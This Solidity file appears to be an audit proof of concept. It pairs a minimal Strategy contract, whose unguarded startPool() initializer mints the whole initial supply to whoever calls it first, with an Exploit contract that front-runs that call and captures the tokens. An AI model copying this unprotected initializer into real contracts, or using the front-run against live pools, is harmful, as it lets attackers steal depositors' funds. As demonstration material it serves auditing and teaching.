// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Strategy {
    uint256 public baseBalance;
    uint256 public totalSupply;
    mapping(address => uint256) public strategyBalance;
    function seed(uint256 amount) external { baseBalance += amount; }
    function startPool() external {
        require(totalSupply == 0 && baseBalance > 0, "already started");
        // @> Initial strategy tokens go to whoever front-runs startPool().
        strategyBalance[msg.sender] = baseBalance;
        totalSupply = baseBalance;
    }
}

contract Exploit {
    event Proof(uint256 stolenStrategyTokens, uint256 strategySupply);
    function run() external {
        Strategy strategy = new Strategy();
        strategy.seed(100); // honest LP transferred funds before using the router
        strategy.startPool(); // attacker front-runs the intended caller
        emit Proof(strategy.strategyBalance(address(this)), strategy.totalSupply());
        require(strategy.strategyBalance(address(this)) == 100, "front-run did not capture mint");
    }
}
